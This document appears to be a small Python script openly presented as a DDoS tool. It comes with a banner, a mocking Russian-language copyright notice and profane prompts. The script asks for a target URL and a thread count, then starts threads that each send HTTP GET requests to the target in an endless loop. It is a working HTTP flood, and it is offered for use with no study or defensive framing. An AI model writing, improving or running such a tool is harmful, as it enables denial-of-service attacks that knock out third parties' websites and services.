#!/usr/bin/python
#coding=utf-8




banner = """
 ____________________________________________________
|                                                    |
| [--] Name: Hujovij DDoS                            |
|                                                    |
| [--] Created by: CamelStyle                        |
|                                                    |
| [--] GitHub:  https://github.com/CamelStyle        |
|                                                    |
| [--] Version: 0.2                                  |
|____________________________________________________|
"""
print (banner)



print("Copyright (С) 2020 Изерская Народная Республика \n Кароч, я не буду вот это вот сейчас рассказывать об авторских правах и все такое, \n ибо не вижу смысла - всё равно этот скрипт (дай б-г) пойдет по рукам и кругу. \n поэтому, если работает - заебца, нет - помоги исправить ошибки :3 \n приятного 'ознакомления'")



import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Хуйню отослал!")
        except requests.exceptions.ConnectionError:
            print("Ошибка соединения!")
threads = 20

url = input("ДАВАЙ САЙТ СЮДА: ")

try:
    threads = int(input("Количество ПОТОКОВ БЛТЬ: "))
except ValueError:
    exit("Ебучее кол-во потоков неправильное!")

if threads == 0:
    exit("тоже, нихуя не верные потоки, пробуй еще!")

if not url.__contains__("http"):
    exit("а, кароч, ссылка не http или https формат!")

if not url.__contains__("."):
    exit("хУЁВЫй домеН")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " ПОТОКИ ХУЯРЯТСЯ, МОЛОДЕЦ!")
